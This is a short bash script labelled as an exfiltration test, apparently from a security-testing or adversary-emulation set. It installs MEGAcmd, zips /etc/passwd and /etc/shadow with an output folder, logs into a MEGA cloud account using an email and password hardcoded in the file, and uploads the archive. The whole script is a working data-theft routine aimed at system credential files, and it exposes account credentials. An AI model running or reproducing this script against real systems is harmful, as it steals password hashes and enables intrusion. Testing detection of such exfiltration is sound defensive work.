#!/bin/bash


# Test -2 Exfiltrate using Megacmd

# Install
echo "[+] Installing Megacmd...."
bash Dependencies/megacmd_install.sh

# MEGA CMD Exfiltration
echo "[+] Starting MEGA CMD Exfiltration..."

#Hostname
HOSTNAME=$(hostname)

# Set the paths
MEGACMD_PATH="/usr/bin"
MEGA_EMAIL="sisabasactivity@outlook.com"
MEGA_PASSWORD="Sisa@123"

#TO zip file and dir
TO_ZIP="/etc/passwd"
SHADOW="/etc/shadow"
ZIPPED_FILE="${HOSTNAME}.zip"
ZIP_FOLDER="Output"
REMOTE_DEST="/Linux/"

# Zip the file
if zip -r "${ZIPPED_FILE}" "${TO_ZIP}" "${SHADOW}" "${ZIP_FOLDER}"; then
  echo "[+] Zipping successful: ${ZIPPED_FILE}"
else
  echo "[-] Zipping failed"
  exit 1
fi

# Login to Mega
echo "[+] Logging in to Mega..."
${MEGACMD_PATH}/mega-login "${MEGA_EMAIL}" "${MEGA_PASSWORD}"

# Upload the zipped file
echo "Uploading to Mega..."
if ${MEGACMD_PATH}/mega-put "${ZIPPED_FILE}" "${REMOTE_DEST}"; then
  echo "[+] Upload successful"
else
  echo "[-] Upload failed"
  exit 1
fi

# Logout from Mega
echo "[!] Logging out from Mega..."
${MEGACMD_PATH}/mega-logout

echo "[!] MEGA CMD Exfiltration completed."

